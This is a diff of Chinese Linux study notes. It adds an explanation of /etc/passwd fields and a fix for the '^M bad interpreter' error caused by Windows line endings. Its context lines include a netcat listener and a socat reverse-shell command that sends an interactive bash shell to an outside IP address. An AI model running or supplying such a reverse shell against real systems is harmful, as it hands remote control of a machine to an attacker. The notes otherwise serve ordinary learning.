@@ -834,6 +834,9 @@ drwxr-xr-x. 10 root root  4096 8月  15 13:34 home
 1-499：系统账号：保留给系统使用的 ID，其实除了 0 之外，其他的 UID 权限与特性并没有不一样。默认 500 以下的数字让给系统作为保留账号只是一个习惯，由于系统上面启动的服务希望使用较小的权限去运行，因此不希望使用 root 的身份去运行这些服务， 所以我们就得要提供这些运行中程序的拥有者账号才行。这些系统账号通常是不可登陆的，比如mysql用户。
 500-65535：可登陆账号：给一般使用者用的。
 
+具体含义：
+用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 Shell
+
 添加用户 -useradd
 
 用法： useradd [参数] [待添加用户名]
@@ -1283,7 +1286,27 @@ nc -lvvp 123
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:175.24.115.4:123
 
 
+结束！
 
+
+
+在Linux中执行.sh脚本，/bin/sh^M: bad interpreter:解决办法
+#在win下编辑的时候，换行结尾是\n\r ， 而在linux下 是\n，所以才会有 多出来的\r
+#可以用以下方式解决先在控制台cd到报错的目录
+ 
+#编辑报错的那个文件
+vi xxx.sh
+ 
+#利用如下命令查看文件格式
+:set ff  或 :set fileformat
+ 
+#可以看到如下信息
+#fileformat=dos 或 fileformat=unix
+ 
+#利用如下命令修改文件格式
+:set ff=unix 或 :set fileformat=unix
+ 
+#保存退出后再次执行sh文件即可
 
 
 
